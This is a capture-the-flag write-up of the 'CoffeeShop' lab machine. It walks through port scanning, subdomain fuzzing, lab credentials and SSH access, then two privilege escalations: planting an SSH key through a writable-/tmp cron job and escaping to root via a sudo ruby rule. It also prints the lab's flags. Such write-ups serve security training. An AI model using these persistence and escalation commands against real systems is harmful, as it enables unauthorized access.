# CoffeeShop

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.113:22
Open 10.0.2.113:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.113
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 81:a4:52:2b:14:3f:13:68:2b:e2:5b:c4:7b:d7:1a:a5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLW4e+GpcOQsiuOBeZsUZYmzGXnD5NPULq1ChTUJBTgBEJBizEvLYnnqC2RFK72GFUKkznMb+9QU1QlHiwCPpAg=
|   256 25:19:09:29:2f:b8:ea:b4:29:1f:6d:e7:13:d6:be:7e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFGOM5914YeBTDG1deiw/MgkX6Ur9d6KloPiFARy6pLw
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Under Construction - Midnight Coffee
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP 

Add DNS record

![writeup.png](/assets/pentest/hackmyvm/coffeeshop/writeup.png)

```bash
└─$ feroxbuster -u http://midnight.coffee -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif -n -x .php -r
200      GET       69l      152w     1690c http://midnight.coffee/index.html
200      GET       43l       82w     1202c http://midnight.coffee/shop/login.php
200      GET       75l      200w     2577c http://midnight.coffee/shop/
```

![writeup-1.png](/assets/pentest/hackmyvm/coffeeshop/writeup-1.png)

Not SQLi
```bash
└─$ sqlmap -u "http://midnight.coffee/shop/login.php" --data="username=x&password=y" --batch --dbms=MySQL --technique=BEU --level 5 --risk 3
# Nothing
```

Fuzz subdomains since we have domain
```bash
└─$ domain='midnight.coffee'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -r -fs 1690
dev                     [Status: 200, Size: 1738, Words: 575, Lines: 72, Duration: 720ms]
```

![writeup-2.png](/assets/pentest/hackmyvm/coffeeshop/writeup-2.png)

::: info Creds
`developer:developer`
:::

We can go back to to `/shop/login.php` and try credentials.

![writeup-3.png](/assets/pentest/hackmyvm/coffeeshop/writeup-3.png)

## SSH

::: info Creds
`tuna:1L0v3_TuN4_Very_Much`
:::

```bash
└─$ sshpass -p '1L0v3_TuN4_Very_Much' ssh tuna@midnight.coffee
tuna@coffee-shop:~$ id
uid=1002(tuna) gid=1002(tuna) groups=1002(tuna)
```

`viminfo` shows edited files. One of the files is crontab. `shopadmin` user is running any bash files in temp every 1 minute.
```bash
tuna@coffee-shop:~$ cat .viminfo | grep '^>'
> /tmp/uwu.sh
> /etc/crontab
> ~/unavailable.sh
> ~/available.txt
> ~/coffee_list.txt

tuna@coffee-shop:~$ cat /etc/crontab
* * * * * /bin/bash /home/shopadmin/execute.sh

tuna@coffee-shop:~$ cat /home/shopadmin/execute.sh
#!/bin/bash

/bin/bash /tmp/*.sh
```

## Privilege Escalation (shopadmin)

Let's add SSH keys
```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOoHrRaj5kPbKlyFzHIdWcReVFpQk00byYyh9tLWec79 woyag@kraken' >> ~/.ssh/authorized_keys
---
tuna@coffee-shop:~$ echo "mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOoHrRaj5kPbKlyFzHIdWcReVFpQk00byYyh9tLWec79 woyag@kraken' >> ~/.ssh/authorized_keys" > /tmp/t.sh
tuna@coffee-shop:~$ for ((i=1;i<=60;i++)); do printf "."; sleep 1; done; echo
---
└─$ ssh -i id_rsa shopadmin@10.0.2.113
shopadmin@coffee-shop:~$ id
uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin)
```

### User.txt

```bash
shopadmin@coffee-shop:~$ cat user.txt
DR1NK1NG-C0FF33-4T-N1GHT
```

## Privilege Escalation (root)

```bash
shopadmin@coffee-shop:~$ sudo -l
Matching Defaults entries for shopadmin on coffee-shop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User shopadmin may run the following commands on coffee-shop:
    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
shopadmin@coffee-shop:~$ ls /opt/
shop.rb
shopadmin@coffee-shop:~$ cat /opt/shop.rb
puts "C0FF33 SHOPS R L33T"
```

- [https://gtfobins.github.io/gtfobins/ruby](https://gtfobins.github.io/gtfobins/ruby)

```bash
shopadmin@coffee-shop:~$ sudo ruby -e 'exec "/bin/bash"' /opt/shop.rb
root@coffee-shop:/home/shopadmin# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@coffee-shop:/home/shopadmin# cat /root/root.txt
C4FF3331N-ADD1CCCTIONNNN
```